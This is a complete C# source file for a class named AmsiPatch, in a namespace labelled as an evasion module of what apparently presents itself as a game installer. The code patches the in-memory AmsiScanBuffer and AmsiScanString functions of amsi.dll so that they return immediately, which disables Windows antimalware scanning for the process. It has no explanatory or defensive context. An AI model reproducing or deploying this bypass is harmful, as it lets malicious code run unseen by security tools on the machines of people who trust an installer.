using System;
using System.Runtime.InteropServices;

namespace ForzaInstallation.Evasion
{
    internal static class AmsiPatch
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        internal static bool Patch()
        {
            try
            {
                var amsi = GetModuleHandle("amsi.dll");
                if (amsi == IntPtr.Zero) return false;
                var addrBuf = GetProcAddress(amsi, "AmsiScanBuffer");
                if (addrBuf != IntPtr.Zero)
                {
                    uint oldProt;
                    VirtualProtect(addrBuf, 3, 0x40, out oldProt);
                    Marshal.WriteByte(addrBuf, 0, 0x31);
                    Marshal.WriteByte(addrBuf, 1, 0xC0);
                    Marshal.WriteByte(addrBuf, 2, 0xC3);
                    uint dummy;
                    VirtualProtect(addrBuf, 3, oldProt, out dummy);
                }
                var addrStr = GetProcAddress(amsi, "AmsiScanString");
                if (addrStr != IntPtr.Zero)
                {
                    uint oldProt;
                    VirtualProtect(addrStr, 3, 0x40, out oldProt);
                    Marshal.WriteByte(addrStr, 0, 0x31);
                    Marshal.WriteByte(addrStr, 1, 0xC0);
                    Marshal.WriteByte(addrStr, 2, 0xC3);
                    uint dummy;
                    VirtualProtect(addrStr, 3, oldProt, out dummy);
                }
                return (addrBuf != IntPtr.Zero || addrStr != IntPtr.Zero);
            }
            catch { return false; }
        }
    }
}
